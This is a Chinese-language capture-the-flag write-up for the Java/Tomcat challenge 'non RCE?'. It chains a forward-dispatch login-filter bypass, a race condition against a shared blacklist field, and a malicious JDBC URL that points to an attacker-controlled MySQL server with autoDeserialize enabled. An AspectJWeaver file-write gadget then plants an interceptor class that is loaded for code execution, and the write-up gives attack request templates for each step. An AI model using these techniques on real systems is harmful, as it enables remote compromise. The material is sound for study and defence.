# non RCE?

## 题目简述

本题是 Java/Tomcat Web 题，入口看起来只是“导入数据库”，但用户可控的 JDBC URL 会被传入 `DriverManager.getConnection()`。真正的利用链不是直接命令执行，而是把一次 MySQL 连接转成 Java 反序列化：先绕过 `/admin/*` 登录过滤，再通过条件竞争绕过 JDBC URL 黑名单，最后借 MySQL Connector/J 的反序列化能力触发 AspectJWeaver 文件写 gadget，并通过 `statementInterceptors` 加载写入的恶意类完成 RCE。

题目源码见 [`Ant-FG-Lab/non_RCE`](https://github.com/Ant-FG-Lab/non_RCE)，官方题解链接为 <https://mp.weixin.qq.com/s/yQ-00YaykUe41S0DdlgoiQ>，复现文章为 <https://www.cnblogs.com/sijidou/p/14631154.html>。这些链接保留作来源；下面把解题所需的源码行为、利用条件和关键 payload 结构直接写入正文。

## 解题过程

先看依赖和可达入口。`pom.xml` 中固定了三个关键版本：

```xml
<tomcat.version>8.5.38</tomcat.version>
<mysql.connector.version>5.1.48</mysql.connector.version>
<aspectjweaver.version>1.9.2</aspectjweaver.version>
```

`AdminServlet` 只处理 `/admin/*`，其中 `/admin/importData` 会读取 `databaseType` 和 `jdbcUrl`，黑名单检查通过后直接连接：

```java
String databaseType = req.getParameter("databaseType");
String jdbcUrl = req.getParameter("jdbcUrl");

if (!BlackListChecker.check(jdbcUrl)) {
    resp.sendError(HttpServletResponse.SC_BAD_REQUEST, "The jdbc url contains illegal character!");
    return;
}

if (("mysql").equals(databaseType)) {
    DriverManager.setLoginTimeout(5);
    Class.forName("com.mysql.jdbc.Driver");
    DriverManager.getConnection(jdbcUrl);
    outputResponse(resp, "ok");
}
```

第一步是进 `/admin/importData`。`LoginFilter` 保护 `/admin/*`，但它只在默认 `REQUEST` dispatcher 下工作；`AntiUrlAttackFilter` 遇到 URL 中含 `./` 或 `;` 时会清理 URL 后 `forward` 到新路径：

```java
if (url.contains("./")) {
    String filteredUrl = url.replaceAll("./", "");
    req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
} else if (url.contains(";")) {
    String filteredUrl = url.replaceAll(";", "");
    req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
}
```

因为 `@WebFilter` 没有显式声明 `DispatcherType.FORWARD`，forward 后不会再次按正常请求语义进入 `LoginFilter`。因此可用 `/./admin/importData` 或 `/adm;in/importData` 这类路径，让 `AntiUrlAttackFilter` 清理后转发到 `/admin/importData`，绕过密码检查。

第二步是让 JDBC URL 带上危险参数。MySQL Connector/J 支持 `autoDeserialize`，当该参数为 `true` 且驱动从服务端结果中读到 Java 序列化对象时，会进入 `ObjectInputStream.readObject()`。这类风险可参考 MySQL Connector/J 反序列化分析 <https://sector7.computest.nl/post/2017-04-mysql-connectorj/>；本题利用时还需要 `statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`，让连接阶段触发状态查询并处理恶意 MySQL 服务端返回的数据。

直接提交危险 URL 会失败，因为 `BlackListChecker` 拦了 `%` 和 `autoDeserialize`：

```java
public String[] blackList = new String[] {"%", "autoDeserialize"};
public volatile String toBeChecked;

public static boolean check(String s) {
    BlackListChecker blackListChecker = getBlackListChecker();
    blackListChecker.setToBeChecked(s);
    return blackListChecker.doCheck();
}

public boolean doCheck() {
    for (String s : blackList) {
        if (toBeChecked.contains(s)) {
            return false;
        }
    }
    return true;
}
```

问题在于 `BlackListChecker` 是单例，`toBeChecked` 是所有请求共享的字段。`check()` 先写入 `toBeChecked`，再调用 `doCheck()`；如果两个请求并发，一个携带危险 JDBC URL，另一个携带普通 URL，就可能在危险请求进入 `doCheck()` 前由普通请求覆盖 `toBeChecked`。这样实际连接使用的仍是危险 URL，但黑名单检查看到的是普通 URL。

危险 JDBC URL 的结构如下，域名和端口指向攻击者控制的 MySQL 服务端：

```text
jdbc:mysql://<attacker-host>:3306/test?
autoDeserialize=true&
statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&
user=<user>&password=<pass>
```

为了赢条件竞争，需要同时发送两类请求：

```text
危险请求：
/./admin/importData?databaseType=mysql&jdbcUrl=jdbc:mysql://<attacker>:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor

覆盖请求：
/./admin/importData?databaseType=mysql&jdbcUrl=jdbc:mysql://127.0.0.1:3306/test
```

第三步是准备反序列化 gadget。题目 classpath 中没有直接可用的通用命令执行链，但有 `aspectjweaver 1.9.2`，其 `SimpleCache$StoreableCachingMap` 可被用作任意文件写 gadget。AspectJWeaver 链的核心效果不是直接执行命令，而是在反序列化过程中调用写文件逻辑，把指定字节写到指定路径；相关 gadget 原理也可参考 AspectJWeaver 反序列化链分析 <https://su18.org/post/ysoserial-su18-6/>。

原始 AspectJWeaver 链通常依赖 Commons Collections 的 `LazyMap/TiedMapEntry` 触发 `Map.get()`。本题提供了自定义 `checker.DataMap`，它实现了 `Map` 且可序列化，`Entry.getValue()` 会回调 `DataMap.this.get(this.key)`，`get()` 又会从内部 `wrapperMap` 取值并写入缓存：

```java
public Object get(Object key) {
    Object v = null;
    if (this.values != null) {
        v = this.values.get(key);
    }
    if (v == null) {
        v = this.wrapperMap.get(key);
        if (this.values == null) {
            this.values = new HashMap(this.wrapperMap.size());
        }
        this.values.put(key, v);
    }
    return v;
}

private final class Entry implements java.util.Map.Entry, Serializable {
    public Object getValue() {
        if (this.value == null) {
            this.value = DataMap.this.get(this.key);
        }
        return this.value;
    }
}
```

因此可以用 `DataMap` 替代部分 Commons Collections 触发器，把 AspectJWeaver 的文件写链串起来。第一轮反序列化的目标是把一个恶意 Java 类写到 Web 应用 classpath 中。这个类可以实现 MySQL Connector/J 的 interceptor 接口，或至少让类加载/初始化阶段执行命令；路径要选在当前应用能加载到的位置。

第四步是加载写入的类。文件写入成功后，再让目标连接一次攻击者 MySQL 服务端，把 JDBC URL 中的 `statementInterceptors` 改成刚写入的类名：

```text
jdbc:mysql://<attacker-host>:3306/test?
statementInterceptors=<evil.interceptor.ClassName>
```

MySQL Connector/J 初始化 interceptor 时会按类名从 classpath 加载并实例化该类，从而触发恶意类中的静态代码块、构造函数或 interceptor 回调。这样就把“non RCE”的文件写 gadget 衔接成真正的命令执行。

完整攻击顺序可以概括为：

1. 用 `/./admin/importData` 或 `/adm;in/importData` 触发 forward，绕过 `/admin/*` 登录过滤。
2. 并发发送危险 JDBC URL 和普通 JDBC URL，利用 `BlackListChecker.toBeChecked` 共享字段赢条件竞争。
3. 让目标连接恶意 MySQL 服务端，通过 `autoDeserialize=true` 和 `ServerStatusDiffInterceptor` 进入反序列化。
4. 用 `DataMap + AspectJWeaver` gadget 写入恶意 interceptor 类。
5. 再次连接时通过 `statementInterceptors=<evil class>` 加载该类，触发 RCE。

## 方法总结

- 核心技巧：把 JDBC URL 可控转成 MySQL Connector/J 反序列化，再用文件写 gadget 与 interceptor 加载机制完成 RCE。
- 识别信号：`DriverManager.getConnection(jdbcUrl)` 使用用户输入、黑名单状态保存在单例共享字段、filter 用 `forward` 清洗 URL 但没有覆盖 `DispatcherType.FORWARD`、依赖中存在 `mysql-connector-java 5.1.48` 和 `aspectjweaver`。
- 复用要点：遇到“只能连接数据库”的入口时，要检查 JDBC URL 扩展参数、驱动版本、interceptor/query hook 和 classpath gadget；只有文件写能力时，也可以通过写入可加载类再让框架加载它，把文件写扩展为 RCE。

